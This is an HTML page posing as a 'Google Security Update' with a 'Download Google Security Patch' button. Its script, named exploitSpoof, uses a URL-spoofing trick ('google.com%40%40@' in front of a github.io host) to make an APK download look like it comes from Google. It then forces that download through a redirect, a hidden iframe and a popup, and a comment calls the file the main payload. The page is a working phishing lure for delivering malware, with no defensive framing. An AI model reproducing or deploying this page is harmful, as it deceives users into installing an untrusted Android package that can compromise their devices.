<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Security Update</title>
</head>
<body>
  <button onclick="exploitSpoof()">Download Google Security Patch</button>

  <script>
    function exploitSpoof() {
      // Payload utama dengan domain Anda
      const spoofedUrl = "https://google.com%40%40@ryynx88.github.io/chy.apk";
      
      // Trigger download
      window.location.href = spoofedUrl;
      
      // Fallback methods
      setTimeout(() => {
        // Method 2: iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = spoofedUrl;
        document.body.appendChild(iframe);
        
        // Method 3: window.open
        window.open(spoofedUrl, 'downloadFrame');
      }, 500);
    }
  </script>
</body>
</html>
